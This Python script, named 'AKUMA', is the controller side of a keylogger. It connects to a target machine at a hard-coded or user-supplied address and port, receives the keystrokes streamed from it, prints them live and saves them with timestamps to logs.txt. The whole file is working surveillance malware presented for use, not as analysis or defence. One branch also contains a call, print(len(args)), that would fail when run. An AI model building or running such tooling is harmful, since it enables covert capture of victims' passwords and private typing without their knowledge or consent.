import sys
import socket
import argparse 
from datetime import date,datetime
import time as tm
import os

class Keylogger:
    def __init__(self,host='192.168.0.158',port=9875):
        self.HOST = host
        self.PORT = port
        self.socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.log = ''
        self.is_append = False

    def connect(self):
        self.socket.connect((self.HOST,self.PORT))
        param = self.socket.recv(1024).decode('utf-8')
        if(param=='1'):
            self.is_append = True
        while True:
            try:
                char = self.socket.recv(20).decode('utf-8')
                self.log+=char
                print(char,end='',flush=True)
            except KeyboardInterrupt:
                time = date.today().strftime("%B %d, %Y") + datetime.now().strftime(" %H:%M:%S")
                if not self.is_append:
                    with open('logs.txt','w') as file:
                        file.write("="*30)
                        file.write(f"\n[{time}]\n\n")
                        file.write(self.log)
                        file.write("\n"+"="*30)
                else:
                    with open('logs.txt','a') as file:
                        file.write("\n"+"="*30)
                        file.write(f"\n[{time}]\n\n")
                        file.write(self.log)
                        file.write("\n"+"="*30)

                print('[***CLOSING THE KEYLOGGER***]\n{WRITING INTO logs.txt}')
                input('[PRESS ANY KEY TO EXIT]:')
                sys.exit()

if __name__=='__main__':
    parser=argparse.ArgumentParser(prog='AKUMA')
    parser.add_argument('-p','--port')
    parser.add_argument('-t','--target')
    parser.add_argument('-a','--addr')
    args=parser.parse_args()
    if(args.port!=None and args.target!=None and args.addr==None):
        print(len(args))
        keylogger=Keylogger(port=int(args.port),host=args.target)
    elif(args.addr!=None and args.port==None and args.target==None):
        try:
            with open(args.addr,'r') as file:
                content=file.read()
            addr=content.split()[1].split(":")
            ADDR=[addr[0],addr[1]]
            keylogger=Keylogger(port=int(ADDR[1]),host=ADDR[0])
        except Exception as err:
            print(repr(err))
            print('[NEEDS AN addr FILE]')
    elif(args.addr==None and args.port==None and args.target==None):
        keylogger=Keylogger()
    else:
        print('[SCRIPT USAGE]\n-t=<host> -p=<port>\n-a : <addr.txt>\n or default')
        sys.exit()
    keylogger.connect()